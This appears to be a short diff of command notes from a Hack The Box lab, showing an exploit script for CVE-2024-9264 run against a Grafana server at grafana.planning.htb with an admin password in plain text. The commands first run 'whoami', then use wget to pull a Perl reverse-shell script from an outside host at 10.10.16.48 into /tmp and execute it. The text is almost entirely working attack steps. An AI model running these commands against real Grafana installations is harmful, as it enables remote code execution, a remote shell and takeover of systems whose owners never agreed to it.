@@ -1,1 +1,12 @@
 python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb/ 
+
+
+
+python CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' \
+-c "perl /tmp/revshell.pl" \
+http://grafana.planning.htb/
+
+
+python CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' \
+-c "wget http://10.10.16.48:8000/revshell.pl -O /tmp/revshell.pl" \
+http://grafana.planning.htb/
